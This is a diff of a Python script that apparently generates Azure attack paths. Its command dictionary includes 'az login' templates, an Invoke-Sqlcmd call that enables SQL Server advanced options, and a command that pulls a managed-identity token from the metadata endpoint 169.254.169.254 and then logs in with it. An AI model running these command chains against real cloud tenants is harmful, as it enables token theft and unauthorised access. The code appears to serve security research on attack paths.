@@ -6,7 +6,7 @@ from os.path import exists
 
 commands: dict[str, str] = {
     "c10": "az login -u <username> -p <password>",
-    "c11": "az login -u <resource> -p <access-token> --service-principal",
+    "c11": "az login --service-principal -u <app-id> -p <password> --tenant <tenant>",
     "c20": 'Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password '
            '"<password>" -Query "EXEC master..sp_configure ‘SHOW advanced options’,1; “RECONFIGURE WITH OVERRIDE;"',
     "c21": 'Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password '
@@ -18,7 +18,7 @@ commands: dict[str, str] = {
            '\"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https'
            '://management.azure.com/\"\'" | Select-String -Pattern \'^{.*}\' | ForEach-Object { $tokenObject = '
            'ConvertFrom-Json $_.Matches[0].Value; $tokenObject.access_token }',
-    "c24": 'az login -u <sqlserver> -p $accessToken --service-principal'
+    "c24": 'az login --service-principal -u <app-id> -p $accessToken  --tenant <tenant>'
 }
 
 # activities -> non-terminal symbols (i.e. upper-case, production rules)
@@ -135,7 +135,7 @@ if __name__ == '__main__':
     expand(starting_state, [], results)
     for result in results:
         print("----------------------------------------------------\n")
-        print("Possible attacks: ")
+        print("Possible attack: ")
         for command in result:
             print("\t> " + command)
         print("\n")
